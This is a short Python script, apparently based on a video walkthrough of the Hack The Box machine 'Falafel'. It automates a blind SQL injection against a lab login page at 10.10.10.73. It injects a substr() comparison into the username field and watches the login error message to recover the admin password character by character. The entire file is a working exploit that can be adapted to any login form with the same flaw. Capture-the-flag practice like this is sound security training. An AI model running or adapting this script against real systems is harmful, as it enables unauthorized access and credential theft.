#!/usr/bin/python3
# Based on Ippsec's video of hackthebox 'Falafel' (https://www.youtube.com/watch?v=CUbWpteTfio)
import requests
import string

postUrl = 'http://10.10.10.73/login.php'
chars = string.ascii_letters+string.digits+string.punctuation

# This is the message we want to see for a successful injection
errorMsg = 'Wrong identification'

# Perform the blind sql injection
def doSqli(index, character):
    return f"admin' and substr(password,{index},1) = '{character}'-- -"
###

for i in range(1,150):
    for c in chars:
        sqli = doSqli(i, c)

        # The post parameters
        payload = {'username':sqli, 'password':'admin'}

        # The actual POST request
        r = requests.post(postUrl, data = payload)
        
        if errorMsg in r.text:
            print(c, end='', flush=True)
            break
        ###

    ###
###
print()
